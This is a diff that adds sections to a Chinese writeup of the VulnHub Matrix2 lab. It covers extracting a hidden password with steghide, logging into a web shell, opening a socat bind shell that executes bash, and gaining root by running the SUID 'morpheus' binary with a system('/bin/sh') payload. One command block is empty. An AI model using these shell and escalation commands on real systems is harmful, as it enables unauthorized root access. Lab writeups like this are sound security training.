@@ -1,5 +1,11 @@
 [TOC]
 
+
+
+# 参考链接
+
+https://www.anquanke.com/post/id/173111#h3-4
+
 # 一、发现主机
 
 在kali中使用`netdiscover`发现主机
@@ -281,3 +287,90 @@ Tr1n17y:admin
 
 未发现任何提示，下载下来尝试查看是否存在隐写。
 
+```shell
+steghide.exe --extract -sf h1dd3n.jpg
+```
+
+![1553691790149](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553691790149.png)
+
+根据这个输出，可以判断出来，这个图片肯定是存在隐写的了，但是要求输入密码，这个密码我们可以推测，当我们刚刚登陆进入nginx以后，首页中的红色字体有可能就是密码，也就是n30，我们尝试输入n30。
+
+![1553691868989](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553691868989.png)
+
+成功的导出txt文件，其名称同样为n30，打开这个txt文件，只有一个字符串
+
+```shell
+P4$$w0rd
+```
+
+猜测它就是密码，既然有密码了，那么肯定有一个登陆的地方。
+
+# 五、12320端口web端shell利用
+
+这时候，我们可以回想起来，前期信息收集的时候，找到了一个12320端口打开是一个web端的shell，可以猜测那里进行登陆。
+
+用root登陆会提示密码错误，那么说明不是root用户的。大胆猜测，既然文本命名为n30，那么是不是有这个用户呢。
+
+尝试用n30登陆，登陆成功
+
+![1553692255830](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553692255830.png)
+
+那么为了方便操作呢，我们反弹shell回来。这个环境里没有nc命令，但是有socat命令，我们用socat反弹
+
+首先在web的shell中输入
+
+```shell
+socat TCP-LISTEN:2222,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
+```
+
+然后在本地输入
+
+```shell
+
+```
+
+![1553692515943](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553692515943.png)
+
+进入普通用户了，那么我们下一步肯定就是提权了。
+
+# 六、提权
+
+首先让我们查看一下它的历史命令
+
+```shell
+cd /home/n30
+ls -al
+more .bash_history
+```
+
+![1553692710898](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553692710898.png)
+
+看到了么，有一条命令看上去就像是提权的
+
+```shell
+morpheus 'BEGIN {system("/bin/sh")}'
+```
+
+让我们查查文件的权限情况
+
+```shell
+find / -perm -u=s -type f 2>/dev/null
+```
+
+![1553692814686](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553692814686.png)
+
+如图，看到了么，/usr/bin/morpheus，是具有suid的，那么我们就执行一下上述命令看看效果。
+
+```shell
+morpheus 'BEGIN {system("/bin/sh")}'
+```
+
+![1553692884182](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553692884182.png)
+
+成功到手，root权限拿下。
+
+查看flag
+
+![1553692937000](F:\学习资料\github\vulnhub-writeup\matrix2-Unknowndevice64\assets\1553692937000.png)
+
+当然，除此之外，其实应该还是有很多其他提权姿势的吧。
